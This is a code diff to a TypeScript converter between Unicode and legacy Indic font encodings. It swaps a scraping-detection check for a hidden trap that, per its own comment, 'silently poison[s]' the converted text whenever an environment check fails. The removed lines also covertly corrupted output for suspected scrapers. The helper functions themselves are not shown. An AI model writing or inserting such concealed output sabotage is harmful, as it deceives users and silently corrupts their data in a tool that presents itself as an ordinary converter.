@@ -10,7 +10,7 @@ import { unicodeToNudi, nudiToUnicode } from './nudiConverter';
 import { unicodeToIsmMalayalam, ismMalayalamToUnicode } from './ismMalayalamConverter';
 import { unicodeToHari, hariToUnicode } from './hariGujaratiConverter';
 import { getMapping, type FontEncoding, type ScriptLanguage } from './mappings/index';
-import { monitorVelocity, detectScrapingDictionary, applyPoison } from './security';
+import { verifyEnvironment, applySubtlePoison } from './security';
 
 export interface UnmappedError {
   index: number;
@@ -121,12 +121,9 @@ export function convertText(
 ): ConversionResult {
   const result = _convertTextInternal(inputText, encoding, reverse, useAltRaaVatthu, script);
 
-  if (inputText && inputText.trim() !== '') {
-    const words = inputText.trim().split(/\s+/).length;
-    const isAttack = detectScrapingDictionary(inputText) || monitorVelocity(inputText.length, words);
-    if (isAttack) {
-      result.convertedText = applyPoison(result.convertedText);
-    }
+  // Silently poison dataset if running on unauthorized domain
+  if (!verifyEnvironment()) {
+    result.convertedText = applySubtlePoison(result.convertedText);
   }
 
   return result;
